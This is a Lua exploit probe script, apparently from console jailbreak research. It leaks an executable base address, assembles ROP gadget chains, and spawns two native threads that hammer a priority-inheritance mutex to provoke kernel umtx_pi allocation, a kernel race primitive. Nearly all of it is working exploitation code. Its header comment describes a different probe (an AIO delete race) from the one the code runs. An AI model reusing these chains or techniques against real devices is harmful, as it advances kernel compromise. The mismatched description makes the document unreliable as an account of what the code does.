-- CRASH_CLASS: HIGH
-- PROBE 523c: AIO delete race on native threads (fixed stack layout)
--
-- Context: 523a ran 300 iterations of three children racing one freshly
-- created id and always produced exactly one 0 and two 0x80020003: the
-- children start about a millisecond apart, so the losers fail at the FIRST
-- table lookup (slot already removed) and never overlap inside the delete's
-- unlock/re-lookup window. 523b/523c-v1 built long chains from rsp = top - 8
-- and died inside the first thr_new: a thr_new child starts at
-- stack_base + size and runs its chain UPWARD from there, so the chain must
-- live above the stack region, inside the same allocation
-- (docs/THREADING_ALIVE_14_10.md).
--
-- This probe first proves the layout with ONE child deleting 20 ids, then
-- launches TWO children that each delete the same 100 ids. If the delete's
-- post-unlock re-lookup loses the race, two children report status 0 for the
-- same id. Overlaps are printed as they are observed, so a crash after a hit
-- still leaves the evidence.

print("=== PROBE 558a: PI MUTEX CONTENTION ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("[0] pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("[A] eboot=" .. fmt(eb))

local g_pop_rax   = eb + 0x992
local g_pop_rdi   = eb + 0xC9DFE
local g_pop_rsi   = eb + 0xD77D
local g_pop_rdx   = eb + 0x3B02D7
local g_bare_ret  = eb + 0x42

local sigact = memory.alloc(0x20)
wq(N(sigact), uint64(1))
wd(N(sigact) + 8, 0)
wq(N(sigact) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sigact, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sigact, uint64(0)) end)

local fake_tcb = memory.alloc(0x1000)
local tcb_a = N(fake_tcb)
for i = 0, 0xFFC, 4 do wd(tcb_a + i, 0) end
for i = 0, 0xFF8, 8 do wq(tcb_a + i, uint64(tcb_a)) end
local fs_ptr = memory.alloc(8)
wq(N(fs_ptr), uint64(tcb_a))

local function emit_sysarch_preamble(emit)
    emit(g_pop_rdi);   emit(uint64(129))
    emit(g_pop_rsi);   emit(uint64(N(fs_ptr)))
    emit(g_pop_rax);   emit(uint64(165))
    emit(stub)
end


-- Two children lock and unlock the same PI mutex 40 times each. Contention is
-- the only path that makes the kernel allocate a umtx_pi object for the owner.
local M = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(M) + i, 0) end
wd(N(M) + 4, 0x10)              -- flags: UMUTEX_PRIO_INHERIT

local sc_thr_new = mk(455)
local ROUNDS = 40

local function build_locker()
    local CHAIN_MAX = 0x8000
    local stk = memory.alloc(0x8000 + CHAIN_MAX)
    local sb = N(stk)
    local ss = 0x8000
    local rsp = sb + ss - 8
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit_sysarch_preamble(emit)
    for i = 1, ROUNDS do
        emit(g_pop_rdi); emit(uint64(N(M)))
        emit(g_pop_rsi); emit(uint64(5))
        emit(g_pop_rdx); emit(uint64(0))
        emit(g_pop_rax); emit(uint64(454))
        emit(stub)
        emit(g_pop_rdi); emit(uint64(N(M)))
        emit(g_pop_rsi); emit(uint64(6))
        emit(g_pop_rdx); emit(uint64(0))
        emit(g_pop_rax); emit(uint64(454))
        emit(stub)
    end
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)
    local par = memory.alloc(0x40)
    local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa + i, 0) end
    wq(pa + 0x00, g_bare_ret)
    wq(pa + 0x08, uint64(0))
    wq(pa + 0x10, uint64(sb))
    wq(pa + 0x18, uint64(ss))
    local tid_ptr = memory.alloc(8)
    wq(N(tid_ptr), uint64(0))
    wq(pa + 0x30, tid_ptr)
    return par, off, tid_ptr
end

print(string.format("[A] launching two PI lockers, %d rounds each", ROUNDS))
local p1, l1, t1 = build_locker()
local p2, l2, t2 = build_locker()
print(string.format("    chains %d / %d bytes", l1, l2))
local ok1, r1 = pcall(function() return sc_thr_new(p1, uint64(0x38)) end)
local ok2, r2 = pcall(function() return sc_thr_new(p2, uint64(0x38)) end)
print(string.format("    thr_new %s/%s alive=%s", tostring(ok1), tostring(ok2), tostring(alive())))
for i = 1, 1500000 do end
local w = rd(N(M)) or 0
print(string.format("[B] mutex word=%08X flags=%08X tid1=%d tid2=%d alive=%s",
    w, rd(N(M) + 4) or 0, rd(N(t1)) or 0, rd(N(t2)) or 0, tostring(alive())))
print(string.format("[C] thr_kill(tid1,0)=%s thr_kill(tid2,0)=%s",
    tostring(N(pcall(function() return mk(432)(uint64(rd(N(t1)) or 0), uint64(0)) end) and 0 or -999)),
    tostring(N(pcall(function() return mk(432)(uint64(rd(N(t2)) or 0), uint64(0)) end) and 0 or -999))))
print(string.format("[D] after: word=%08X alive=%s", rd(N(M)) or 0, tostring(alive())))
print("=== DONE ===")
